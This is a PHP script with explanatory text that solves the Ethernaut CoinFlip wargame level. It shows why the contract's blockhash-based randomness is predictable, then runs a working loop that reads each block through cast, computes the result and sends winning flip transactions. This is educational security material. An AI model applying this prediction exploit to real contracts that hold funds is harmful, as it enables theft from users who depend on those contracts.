<?php 
include "prepare.php";
if (!$_POST):
?>
<pre>
Here is the contract:

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR =
      57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) revert();

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}

🚨 Vulnerability

The contract determines the "coin flip" using:

coinFlip = blockhash(block.number - 1) / FACTOR


This is deterministic.

Anyone can compute:

correctGuess = uint256(blockhash(block.number - 1)) / FACTOR;


So the attacker can predict every result.

Goal:

Call flip(correctGuess) 10 times in a row → you win Ethernaut level.

🧠 Why does this exploit work?

Because:

blockhash(block.number - 1) is public

FACTOR is known

Division always yields 0 or 1

So you can compute "heads or tails" exactly

The randomness is fake and predictable.

🔥 Attack Strategy (cast version)

You must:

Compute the correct side

Call flip(side)

Repeat 10 times

STEP 1 — Compute correct side in JS / PHP / cast

With cast you can compute blockhash:

cast rpc eth_getBlockByNumber latest false


Or simpler:

cast block --rpc-url $RPC | jq .hash


Then compute:

side = uint256(blockhash) / FACTOR    
<?php
exit;
endif;

// -------------------------------------------
// Helper: convert hex → big integer string
// -------------------------------------------
function hexToDecString($hex) {
    $hex = strtolower(str_replace("0x", "", $hex));
    $dec = "0";

    for ($i = 0; $i < strlen($hex); $i++) {
        $dec = bcmul($dec, "16");
        $dec = bcadd($dec, hexdec($hex[$i]));
    }
    return $dec;
}



// -------------------------------------------
// FACTOR constant (as string)
// -------------------------------------------
$FACTOR = "57896044618658097711785492504343953926634992332820282019728792003956564819968";

echo "<pre>";
echo "<div style='font-size:22px; font-weight:bold; color:#444;'>Attacking CoinFlip</div>\n";
echo "Contract: $CONTRACT\n";
echo "Player:   $PLAYER\n";


// -------------------------------------------
// Run 10 Rounds
// -------------------------------------------
for ($round = 1; $round <= 10; $round++) {

    echo "\n\n-------------------------------\n";
    echo " ROUND $round\n";
    echo "-------------------------------\n";

    // Read block in
    //    echo "cast block --rpc-url $RPC --json\n";n";
    $json = cast("cast block --rpc-url $RPC --json");
    $blockInfo = json_decode($json, true);
    $blockHash = $blockInfo["hash"];

    echo "blockhash: $blockHash\n";

    // Convert hash -> int string
    $blockInt = hexToDecString($blockHash);

    // Compute correct side (0 or 1)
    $side = bcdiv($blockInt, $FACTOR, 0);

    // Convert to correct boolean format
    $boolStr = ($side === "1") ? "true" : "false";

    echo "Correct side: $boolStr\n";

    // Flip with the correct guess
    echo cast(
        "cast send $CONTRACT \"flip(bool)\" $boolStr " .
        "--private-key $PK --rpc-url $RPC"
    );

    // Check wins
    echo "\nCurrent wins:\n";
    echo cast(
        "cast call $CONTRACT \"consecutiveWins()\" --rpc-url $RPC"
    );
}

echo "</pre>";
?>
